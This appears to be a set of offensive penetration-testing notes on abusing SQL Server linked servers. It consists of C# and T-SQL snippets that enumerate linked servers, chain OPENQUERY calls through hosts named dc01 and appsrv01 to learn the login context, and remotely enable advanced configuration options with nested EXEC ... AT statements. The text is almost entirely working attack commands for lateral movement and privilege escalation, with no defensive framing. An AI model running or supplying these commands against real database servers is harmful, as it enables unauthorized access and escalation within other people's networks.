#Enumerate servers linked to the current SQL server

String execCmd = "EXEC sp_linkedservers;";
SqlCommand command = new SqlCommand(execCmd, con);
SqlDataReader reader = command.ExecuteReader();
while (reader.Read())
{
Console.WriteLine("Linked SQL server: " + reader[0]);
}
reader.Close();

#perform a SQL query on a linked server
select version from openquery("dc01", 'select @@version as version')

#Executing sp_configre on linked server
EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT DC01

#Find linked servers on DC01
EXEC ('sp_linkedservers') AT DC01

#Finding the login on APPSRV01 after following the links
select mylogin from openquery("dc01", 'select mylogin from openquery("appsrv01",''select SYSTEM_USER as mylogin'')')

#Enabling advanced options on appsrv01
EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT appsrv01') AT dc01

